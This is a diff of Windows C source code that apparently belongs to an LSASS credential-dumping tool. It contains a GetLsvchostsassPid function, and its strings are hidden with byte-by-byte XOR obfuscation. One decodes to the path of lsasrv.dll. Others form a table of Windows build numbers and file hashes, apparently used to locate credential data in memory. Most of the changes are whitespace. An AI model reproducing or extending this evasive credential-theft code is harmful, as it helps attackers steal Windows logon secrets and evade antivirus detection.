@@ -2,7 +2,7 @@
 #include <Windows.h>
 
 #include <tchar.h>
-
+#define wotamaxiangshuijiaoa
 #include <windows.h>
 
 #include <stdio.h>
@@ -524,8 +524,6 @@ int mainMD5() {
 	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 118; _fuckingstring[4] = 104; _fuckingstring[5] = 111; _fuckingstring[6] = 101; _fuckingstring[7] = 110; _fuckingstring[8] = 118; _fuckingstring[9] = 114; _fuckingstring[10] = 93; _fuckingstring[11] = 114; _fuckingstring[12] = 120; _fuckingstring[13] = 114; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 108; _fuckingstring[17] = 50; _fuckingstring[18] = 51; _fuckingstring[19] = 93; _fuckingstring[20] = 109; _fuckingstring[21] = 114; _fuckingstring[22] = 96; _fuckingstring[23] = 114; _fuckingstring[24] = 115; _fuckingstring[25] = 119; _fuckingstring[26] = 47; _fuckingstring[27] = 101; _fuckingstring[28] = 109; _fuckingstring[29] = 109; _fuckingstring[30] = 1; FBXorCrypt(_fuckingstring, 31);
 	//char filePath[100] = _fuckingstring;
 
-
-
 	return CalculateMD5(_fuckingstring);
 
 }
@@ -819,490 +817,506 @@ int GetLsvchostsassPid() {
 int main()
 {
 	char _fuckingstring0[100];
-MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde0 = (char*)malloc(100); memcpy(_caoniamde0, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 51; _fuckingstring0[12] = 56; _fuckingstring0[13] = 48; _fuckingstring0[14] = 50; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde1 = (char*)malloc(100); memcpy(_caoniamde1, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 54; _fuckingstring0[11] = 52; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde2 = (char*)malloc(100); memcpy(_caoniamde2, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 51; _fuckingstring0[6] = 51; _fuckingstring0[7] = 55; _fuckingstring0[8] = 51; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde3 = (char*)malloc(100); memcpy(_caoniamde3, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 53; _fuckingstring0[7] = 50; _fuckingstring0[8] = 56; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 49; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde4 = (char*)malloc(100); memcpy(_caoniamde4, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 54; _fuckingstring0[7] = 54; _fuckingstring0[8] = 55; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde5 = (char*)malloc(100); memcpy(_caoniamde5, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 53; _fuckingstring0[11] = 51; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde6 = (char*)malloc(100); memcpy(_caoniamde6, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 52; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde7 = (char*)malloc(100); memcpy(_caoniamde7, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 50; _fuckingstring0[3] = 47; _fuckingstring0[4] = 56; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde8 = (char*)malloc(100); memcpy(_caoniamde8, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 55; _fuckingstring0[11] = 52; _fuckingstring0[12] = 55; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde9 = (char*)malloc(100); memcpy(_caoniamde9, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 55; _fuckingstring0[7] = 51; _fuckingstring0[8] = 56; _fuckingstring0[9] = 56; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde10 = (char*)malloc(100); memcpy(_caoniamde10, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 50; _fuckingstring0[12] = 50; _fuckingstring0[13] = 51; _fuckingstring0[14] = 53; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde11 = (char*)malloc(100); memcpy(_caoniamde11, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 54; _fuckingstring0[7] = 54; _fuckingstring0[8] = 55; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 54; _fuckingstring0[14] = 54; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde12 = (char*)malloc(100); memcpy(_caoniamde12, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 54; _fuckingstring0[7] = 54; _fuckingstring0[8] = 55; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 54; _fuckingstring0[14] = 54; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde13 = (char*)malloc(100); memcpy(_caoniamde13, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 50; _fuckingstring0[12] = 52; _fuckingstring0[13] = 54; _fuckingstring0[14] = 49; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde14 = (char*)malloc(100); memcpy(_caoniamde14, _fuckingstring0, 100);
-/*stringarray*/	char* version_table[TABLE_LENGTH] = {
+	MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde0 = (char*)malloc(100); memcpy(_caoniamde0, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 51; _fuckingstring0[12] = 56; _fuckingstring0[13] = 48; _fuckingstring0[14] = 50; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde1 = (char*)malloc(100); memcpy(_caoniamde1, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 54; _fuckingstring0[11] = 52; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde2 = (char*)malloc(100); memcpy(_caoniamde2, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 51; _fuckingstring0[6] = 51; _fuckingstring0[7] = 55; _fuckingstring0[8] = 51; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde3 = (char*)malloc(100); memcpy(_caoniamde3, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 53; _fuckingstring0[7] = 50; _fuckingstring0[8] = 56; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 49; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde4 = (char*)malloc(100); memcpy(_caoniamde4, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 54; _fuckingstring0[7] = 54; _fuckingstring0[8] = 55; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 48; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde5 = (char*)malloc(100); memcpy(_caoniamde5, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 53; _fuckingstring0[11] = 51; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde6 = (char*)malloc(100); memcpy(_caoniamde6, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 52; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde7 = (char*)malloc(100); memcpy(_caoniamde7, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 50; _fuckingstring0[3] = 47; _fuckingstring0[4] = 56; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde8 = (char*)malloc(100); memcpy(_caoniamde8, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 55; _fuckingstring0[11] = 52; _fuckingstring0[12] = 55; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde9 = (char*)malloc(100); memcpy(_caoniamde9, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 55; _fuckingstring0[7] = 51; _fuckingstring0[8] = 56; _fuckingstring0[9] = 56; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde10 = (char*)malloc(100); memcpy(_caoniamde10, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 50; _fuckingstring0[12] = 50; _fuckingstring0[13] = 51; _fuckingstring0[14] = 53; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde11 = (char*)malloc(100); memcpy(_caoniamde11, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 54; _fuckingstring0[7] = 54; _fuckingstring0[8] = 55; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 54; _fuckingstring0[14] = 54; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde12 = (char*)malloc(100); memcpy(_caoniamde12, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 54; _fuckingstring0[7] = 54; _fuckingstring0[8] = 55; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 54; _fuckingstring0[14] = 54; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde13 = (char*)malloc(100); memcpy(_caoniamde13, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 56; _fuckingstring0[7] = 49; _fuckingstring0[8] = 53; _fuckingstring0[9] = 48; _fuckingstring0[10] = 47; _fuckingstring0[11] = 50; _fuckingstring0[12] = 52; _fuckingstring0[13] = 54; _fuckingstring0[14] = 49; _fuckingstring0[15] = 1; FBXorCrypt(_fuckingstring0, 16); char* _caoniamde14 = (char*)malloc(100); memcpy(_caoniamde14, _fuckingstring0, 100);
+	/*stringarray*/	char* version_table[TABLE_LENGTH] = {
 
-_caoniamde0,
+	_caoniamde0,
 
-_caoniamde1,
+	_caoniamde1,
 
-_caoniamde2,
+	_caoniamde2,
 
-_caoniamde3,
+	_caoniamde3,
 
-_caoniamde4,
+	_caoniamde4,
 
-_caoniamde5,
+	_caoniamde5,
 
-_caoniamde6,
+	_caoniamde6,
 
-_caoniamde7,
+	_caoniamde7,
 
-_caoniamde8,
+	_caoniamde8,
 
-_caoniamde9,
+	_caoniamde9,
 
-_caoniamde10,
+	_caoniamde10,
 
-_caoniamde11,
+	_caoniamde11,
 
-_caoniamde12,
+	_caoniamde12,
 
-_caoniamde13,
+	_caoniamde13,
 
-_caoniamde14
+	_caoniamde14
 
-};/*endarray*/
+	};/*endarray*/
 
 
 
-MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 100; _fuckingstring0[1] = 57; _fuckingstring0[2] = 55; _fuckingstring0[3] = 51; _fuckingstring0[4] = 49; _fuckingstring0[5] = 49; _fuckingstring0[6] = 50; _fuckingstring0[7] = 96; _fuckingstring0[8] = 100; _fuckingstring0[9] = 96; _fuckingstring0[10] = 57; _fuckingstring0[11] = 98; _fuckingstring0[12] = 50; _fuckingstring0[13] = 53; _fuckingstring0[14] = 55; _fuckingstring0[15] = 50; _fuckingstring0[16] = 103; _fuckingstring0[17] = 54; _fuckingstring0[18] = 51; _fuckingstring0[19] = 101; _fuckingstring0[20] = 54; _fuckingstring0[21] = 51; _fuckingstring0[22] = 51; _fuckingstring0[23] = 52; _fuckingstring0[24] = 101; _fuckingstring0[25] = 48; _fuckingstring0[26] = 101; _fuckingstring0[27] = 103; _fuckingstring0[28] = 99; _fuckingstring0[29] = 98; _fuckingstring0[30] = 103; _fuckingstring0[31] = 49; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde15 = (char*)malloc(100); memcpy(_caoniamde15, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 101; _fuckingstring0[1] = 51; _fuckingstring0[2] = 51; _fuckingstring0[3] = 100; _fuckingstring0[4] = 49; _fuckingstring0[5] = 51; _fuckingstring0[6] = 51; _fuckingstring0[7] = 48; _fuckingstring0[8] = 103; _fuckingstring0[9] = 103; _fuckingstring0[10] = 96; _fuckingstring0[11] = 52; _fuckingstring0[12] = 100; _fuckingstring0[13] = 50; _fuckingstring0[14] = 50; _fuckingstring0[15] = 99; _fuckingstring0[16] = 48; _fuckingstring0[17] = 100; _fuckingstring0[18] = 103; _fuckingstring0[19] = 50; _fuckingstring0[20] = 54; _fuckingstring0[21] = 99; _fuckingstring0[22] = 48; _fuckingstring0[23] = 49; _fuckingstring0[24] = 53; _fuckingstring0[25] = 103; _fuckingstring0[26] = 103; _fuckingstring0[27] = 52; _fuckingstring0[28] = 52; _fuckingstring0[29] = 55; _fuckingstring0[30] = 48; _fuckingstring0[31] = 53; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde16 = (char*)malloc(100); memcpy(_caoniamde16, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 54; _fuckingstring0[11] = 52; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde17 = (char*)malloc(100); memcpy(_caoniamde17, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 99; _fuckingstring0[1] = 99; _fuckingstring0[2] = 96; _fuckingstring0[3] = 55; _fuckingstring0[4] = 51; _fuckingstring0[5] = 54; _fuckingstring0[6] = 55; _fuckingstring0[7] = 55; _fuckingstring0[8] = 49; _fuckingstring0[9] = 98; _fuckingstring0[10] = 57; _fuckingstring0[11] = 53; _fuckingstring0[12] = 99; _fuckingstring0[13] = 96; _fuckingstring0[14] = 49; _fuckingstring0[15] = 50; _fuckingstring0[16] = 52; _fuckingstring0[17] = 99; _fuckingstring0[18] = 101; _fuckingstring0[19] = 98; _fuckingstring0[20] = 98; _fuckingstring0[21] = 96; _fuckingstring0[22] = 101; _fuckingstring0[23] = 99; _fuckingstring0[24] = 99; _fuckingstring0[25] = 56; _fuckingstring0[26] = 54; _fuckingstring0[27] = 51; _fuckingstring0[28] = 57; _fuckingstring0[29] = 52; _fuckingstring0[30] = 101; _fuckingstring0[31] = 96; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde18 = (char*)malloc(100); memcpy(_caoniamde18, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 53; _fuckingstring0[7] = 50; _fuckingstring0[8] = 56; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 49; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde19 = (char*)malloc(100); memcpy(_caoniamde19, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 99; _fuckingstring0[2] = 96; _fuckingstring0[3] = 53; _fuckingstring0[4] = 49; _fuckingstring0[5] = 101; _fuckingstring0[6] = 48; _fuckingstring0[7] = 52; _fuckingstring0[8] = 53; _fuckingstring0[9] = 51; _fuckingstring0[10] = 55; _fuckingstring0[11] = 103; _fuckingstring0[12] = 100; _fuckingstring0[13] = 52; _fuckingstring0[14] = 55; _fuckingstring0[15] = 57; _fuckingstring0[16] = 100; _fuckingstring0[17] = 53; _fuckingstring0[18] = 53; _fuckingstring0[19] = 50; _fuckingstring0[20] = 96; _fuckingstring0[21] = 52; _fuckingstring0[22] = 51; _fuckingstring0[23] = 100; _fuckingstring0[24] = 49; _fuckingstring0[25] = 49; _fuckingstring0[26] = 57; _fuckingstring0[27] = 101; _fuckingstring0[28] = 99; _fuckingstring0[29] = 48; _fuckingstring0[30] = 101; _fuckingstring0[31] = 54; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde20 = (char*)malloc(100); memcpy(_caoniamde20, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 53; _fuckingstring0[11] = 51; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde21 = (char*)malloc(100); memcpy(_caoniamde21, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 52; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde22 = (char*)malloc(100); memcpy(_caoniamde22, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 50; _fuckingstring0[3] = 47; _fuckingstring0[4] = 56; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde23 = (char*)malloc(100); memcpy(_caoniamde23, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 55; _fuckingstring0[11] = 52; _fuckingstring0[12] = 55; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde24 = (char*)malloc(100); memcpy(_caoniamde24, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; 